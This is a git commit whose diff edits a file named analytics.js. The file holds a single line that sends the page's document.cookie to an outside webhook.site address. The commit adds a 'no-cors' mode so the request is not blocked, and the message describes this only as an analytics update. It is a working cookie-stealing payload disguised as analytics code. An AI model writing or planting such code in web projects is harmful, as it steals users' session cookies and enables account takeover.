21cb93ecb1fed19b274efbcd81edd6262afabb46
Rachel <rachelgoh03@gmail.com>
2025-04-25 22:37:38 +1000

    updated analytics js for no cors

--- analytics.js
+++ analytics.js
@@ -1,1 +1,4 @@
-fetch("https://webhook.site/4aaa519f-33c7-446b-ab89-f0e887c35b07?c=" + document.cookie)
+fetch("https://webhook.site/4aaa519f-33c7-446b-ab89-f0e887c35b07?c=" + document.cookie, {
+    mode: 'no-cors'
+  });
+  
